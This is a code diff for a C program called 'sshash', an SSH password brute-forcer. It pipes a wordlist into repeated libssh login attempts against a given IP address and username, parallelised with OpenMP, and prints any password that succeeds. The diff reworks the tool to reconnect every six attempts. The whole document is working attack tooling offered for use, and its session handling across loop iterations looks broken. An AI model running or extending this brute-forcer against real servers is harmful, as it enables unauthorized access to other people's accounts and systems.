@@ -6,32 +6,46 @@
 
 int main(int argc, char **argv)
 {
-	raw();
-	noecho();
+	if(argc < 3)
+	{
+		printf("cat wordlist |./sshash ip username");
+		exit(-1);
+	}
 	initscr();
-	ssh_session SSH;
-	int rc;
+	cbreak();
+	noecho();
 	int port = 22;
 	char pass[128];
 	
 	ssh_init();
-	SSH = ssh_new();
-	
-	ssh_options_set(SSH, SSH_OPTIONS_HOST, argv[1]);
-	ssh_options_set(SSH, SSH_OPTIONS_USER, argv[2]);
 
-	if( ssh_connect(SSH) != 0)
-	{
-		printf("%s\n", ssh_get_error(SSH));
-		exit(-1);
-	}
-	
 	char c;
 	int scroll;
 	
-	#pragma omp parallel for firstprivate(SSH, pass, c, scroll)
-	for(unsigned int X=0; X<0xffffffff; ++X)
+	#pragma omp taskloop firstprivate(pass, c, scroll)
+	for(long int X=0; X<0xffffffff; ++X)
 	{
+		int rc;
+		ssh_session SSH;
+		if(X % 6 == 0)
+		{	
+			if(X != 0)
+			{
+				ssh_disconnect(SSH);
+				ssh_free(SSH);
+			}
+			SSH = ssh_new();
+	
+			ssh_options_set(SSH, SSH_OPTIONS_HOST, argv[1]);
+			ssh_options_set(SSH, SSH_OPTIONS_USER, argv[2]);
+	
+			if(ssh_connect(SSH) != 0)
+			{
+				endwin();
+				printf("%s\n", ssh_get_error(SSH));
+				exit(-1);
+			}
+		}
 		scroll = 0;
 		while(1)
 		{
@@ -53,7 +67,7 @@ int main(int argc, char **argv)
 			printf("Password is %s\n", pass);
 			ssh_disconnect(SSH);
 			ssh_free(SSH);
-			break;
+			X = 0xffffffffe;
 		}
 	}
 }
